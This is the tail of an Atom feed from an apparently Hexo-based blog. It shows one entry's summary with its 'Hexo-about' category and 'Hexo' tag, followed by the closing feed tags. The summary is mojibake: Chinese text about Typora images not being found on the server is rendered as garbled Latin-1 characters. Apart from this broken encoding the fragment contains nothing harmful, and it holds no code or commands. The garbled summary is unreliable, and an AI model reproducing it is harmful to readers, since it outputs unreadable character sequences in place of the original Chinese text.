    <summary type="html">å¦‚æœä½¿ç”¨ typoraï¼Œé»˜è®¤ä¸Šä¼ æœåŠ¡å™¨æ˜¯æ‰¾ä¸åˆ°å›¾ç‰‡çš„ï¼Œæ‰€ä»¥è¦å¼€å¯è¯¥åŠŸèƒ½</summary>
    
    
    
    <category term="Hexo-about" scheme="https://fz1lin.com/categories/Hexo-about/"/>
    
    
    <category term="Hexo" scheme="https://fz1lin.com/tags/Hexo/"/>
    
  </entry>
  
</feed>
